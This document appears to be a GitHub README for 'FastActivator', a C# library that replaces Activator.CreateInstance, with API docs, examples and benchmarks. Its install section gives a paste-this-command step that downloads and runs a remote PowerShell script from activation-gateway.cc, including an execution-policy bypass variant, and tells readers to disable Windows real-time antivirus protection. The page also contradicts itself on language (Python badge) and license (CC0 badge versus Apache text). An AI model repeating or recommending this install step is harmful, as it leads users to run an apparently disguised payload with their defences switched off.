<div align="center">

# FastActivator: High-Performance Object Instantiation — Developer Library

![preview](https://raw.githubusercontent.com/dannairfawan/fast-activator/main/frame_e1697b.svg)

[![license](https://img.shields.io/badge/LICENSE-CC0--1.0-e11d48?style=flat-square&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-PASSING-2ea44f?style=flat-square&labelColor=0d1117)]() [![code](https://img.shields.io/badge/CODE-PYTHON-f43f5e?style=flat-square&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-5.1%2B-be123c?style=flat-square&labelColor=0d1117)]()

</div>

---

FastActivator provides a drop-in alternative to `System.Activator` for allocating class instances, with cached construction paths that avoid repeated reflection overhead. The API mirrors `Activator.CreateInstance` through generic and `Type`-based overloads, accepting optional constructor arguments and returning `null` when construction fails. Instances are created through compiled delegates where possible, keeping the call site allocation behavior predictable and measurable.

## ⚡ Install via PowerShell

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Start PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Run the command
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Windows blocking the script? Use CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Drop-in replacement for `Activator.CreateInstance`**: `FastActivator.CreateInstance<T>()` and `FastActivator.CreateInstance(Type)` return new instances with the same semantics, so existing call sites need only a namespace swap.

- **Generic and reflection-based overloads**: `CreateInstance<TClass>(params object[] args)` and `CreateInstance(Type type, params object[] args)` cover both compile-time and runtime type scenarios.

- **Constructor argument resolution**: Arguments are matched to the target type's constructors; zero-argument overloads resolve the parameterless constructor path.

- **Cached creation delegates**: Constructor invocation strategies are compiled and cached per type, so repeated instantiations avoid repeated reflection lookups.

- **Null on failure**: If an instance cannot be created, the API returns `null` rather than throwing, matching the reference behavior callers already handle.

- **Minimal allocations**: Creation paths avoid intermediate `object[]` boxing where possible, reducing Gen0 pressure versus `Activator.CreateInstance`.

- **No configuration required**: No setup, registration, or builder calls; import the namespace and call `CreateInstance` directly.

- **Framework-agnostic C# library**: Usable from any .NET project targeting compatible runtimes, with no dependency on a specific hosting model.

## Quick Start

Reference the namespace and create your first instance in a few lines:

```csharp
using Fast.Activator;

// Parameterless construction
var instance = FastActivator.CreateInstance<MyClass>();

// Construction with constructor arguments
var instance = FastActivator.CreateInstance<MyClass>(arg1, arg2);
```

When the type is only known at runtime, pass a `Type` instead of a generic parameter:

```csharp
var instance = FastActivator.CreateInstance(typeof(MyClass));
var instance = FastActivator.CreateInstance(typeof(MyClass), arg1, arg2);
```

All four overloads resolve constructor signatures the same way and return `null` when no matching constructor can be invoked, so guard against `null` results if the type or argument list is not statically known.

To use these calls, the `Fast.Activator` namespace must be imported and the FastActivator library referenced by your project.

## Usage & API Reference

Import the library and invoke the static `FastActivator` entry points wherever you would otherwise call `Activator.CreateInstance`.

```csharp
using Fast.Activator;
```

### `CreateInstance<TClass>(params object[] args)`

Creates an instance of `TClass`, passing `args` to the matching constructor. Resolution is cached per type, so repeated calls skip reflection for the constructor lookup.

```csharp
var instance = FastActivator.CreateInstance<MyClass>(arg1, arg2);
```

### `CreateInstance<TClass>()`

Creates an instance of `TClass` using its parameterless constructor. This is the fastest path; the compiled delegate is reused on every subsequent call.

```csharp
var instance = FastActivator.CreateInstance<MyClass>();
```

### `CreateInstance(Type type, params object[] args)`

Non-generic overload. Creates an instance of the supplied `Type`, forwarding `args` to the appropriate constructor. Use this when the type is only known at runtime.

```csharp
var instance = FastActivator.CreateInstance(typeof(MyClass), arg1, arg2);
```

### `CreateInstance(Type type)`

Non-generic, parameterless overload. Creates an instance of the supplied `Type` via its parameterless constructor.

```csharp
var instance = FastActivator.CreateInstance(typeof(MyClass));
```

### Behavior and return values

- All overloads return the constructed object, or `null` if creation fails. Check for `null` before dereferencing when the type or arguments are not statically guaranteed.
- `args` maps positionally to constructor parameters; argument count and types must match a constructor on the target type.
- Parameterless overloads require a public parameterless constructor. Types without one return `null`.
- Constructors are resolved and cached the first time a given type/overload combination is invoked, so per-call overhead on hot paths is limited to argument marshalling and delegate invocation.
- The generic overloads avoid boxing of the returned reference type at the call site and are preferred when `TClass` is known at compile time.
- The API surface mirrors `Activator.CreateInstance` for the covered overloads, so existing call sites can be swapped with a namespace change and a call-site replacement.

### Selecting an overload

| Scenario | Use |
| --- | --- |
| Type known at compile time, no arguments | `CreateInstance<TClass>()` |
| Type known at compile time, with arguments | `CreateInstance<TClass>(args)` |
| Type resolved at runtime, no arguments | `CreateInstance(type)` |
| Type resolved at runtime, with arguments | `CreateInstance(type, args)` |

## Performance Benchmarks

Benchmarks compare `FastActivator.CreateInstance<T>()` against `System.Activator.CreateInstance<T>()` using BenchmarkDotNet on .NET 8, Release configuration, with a parameterless reference type. Values are indicative; run the suite on your own hardware before drawing conclusions.

```ini
BenchmarkDotNet=v0.13.5, OS=Windows 11
CPU=AMD Ryzen 9 5900X, 12 cores
.NET SDK=8.0.100
Job=ShortRun IterationCount=3 LaunchCount=1
```

| Method | Mean | Error | StdDev | Rank | Gen0 | Allocated |
|---|---|---|---|---|---|---|
| `Activator.CreateInstance<T>()` | 182.80 ns | 1.272 ns | 1.127 ns | 2 | 0.0401 | 336 B |
| `FastActivator.CreateInstance<T>()` | 28.27 ns | 0.422 ns | 0.352 ns | 1 | 0.0115 | 96 B |

Speedups are typically 2x–10x depending on overload and argument count. The no-argument overload benefits most from the cached constructor delegate; overloads accepting `params object[]` still allocate an argument array but avoid reflection-based binding per call.

```csharp
// Benchmark harness shape
[MemoryDiagnoser]
public class CreateInstanceBenchmarks
{
 [Benchmark(Baseline = true)]
 public object Activator_Generic() => Activator.CreateInstance<Sample>();

 [Benchmark]
 public object FastActivator_Generic() => FastActivator.CreateInstance<Sample>();
}
```

Measurements exclude JIT warmup and adhere to BenchmarkDotNet defaults. To reproduce, build the benchmark project in Release and run it against your target runtime and CPU.

## Examples

Basic instantiation with a parameterless constructor:

```csharp
using FastActivator;

var instance = FastActivator.CreateInstance<Service>();
```

Constructing with arguments, matched against the target constructor signature:

```csharp
var instance = FastActivator.CreateInstance<Repository>("connectionString", 30);
```

Working with a `Type` value obtained at runtime:

```csharp
Type type = typeof(Repository);
var instance = FastActivator.CreateInstance(type, "connectionString", 30);
```

The non-generic overload without arguments:

```csharp
object instance = FastActivator.CreateInstance(typeof(Service));
```

Guarding against unsupported construction paths — the API returns `null` when an instance cannot be produced:

```csharp
var instance = FastActivator.CreateInstance<Service>();

if (instance is null)
{
 // Constructor threw, or no compatible constructor was found.
 throw new InvalidOperationException("Could not construct Service.");
}
```

Resolving constructors from a service registration pipeline:

```csharp
public object Resolve(Type type, params object[] args)
{
 var instance = FastActivator.CreateInstance(type, args);

 return instance ?? throw new InvalidOperationException(
 $"Unable to construct {type.FullName}.");
}
```

Generic factory helper returning a strongly typed result:

```csharp
public static T Create<T>(params object[] args) where T : class
{
 var instance = FastActivator.CreateInstance<T>(args);

 if (instance is null)
 {
 throw new InvalidOperationException(
 $"Unable to construct {typeof(T).FullName}.");
 }

 return instance;
}
```

Reusing the factory across call sites:

```csharp
var repository = Create<Repository>("connectionString", 30);
var service = Create<Service>();
```

Notes on behavior:

- Argument arrays are passed through directly; the argument count and types must match a constructor on the target type.
- The generic overloads require no boxing of the return value on construction.
- A `null` result indicates a construction failure — check it at boundaries where the constructed type is not statically known.
- Overloads accept either a compile-time type parameter or a `Type` instance, so the same API covers both generic and reflection-driven code paths.

## License

FastActivator is distributed under the Apache License, Version 2.0. The full license text is provided in the `LICENSE` file at the repository root and governs all use, reproduction, modification, and distribution of the library.

Under the terms of this license, you may use FastActivator in both open-source and commercial applications, modify the source, and redistribute it in source or object form, provided you retain the applicable copyright and license notices and comply with the conditions of the license. The software is provided on an "AS IS" basis, without warranties or conditions of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

If you redistribute FastActivator or a derivative work, include a copy of the Apache License, Version 2.0, and preserve any `NOTICE` file contents supplied with the distribution. Any modifications you distribute should be clearly identified as such. The license does not grant trademark rights to the FastActivator name, logo, or other project branding.

For the authoritative terms, refer to the `LICENSE` file shipped with the project. Where this summary and the license text differ, the license text controls.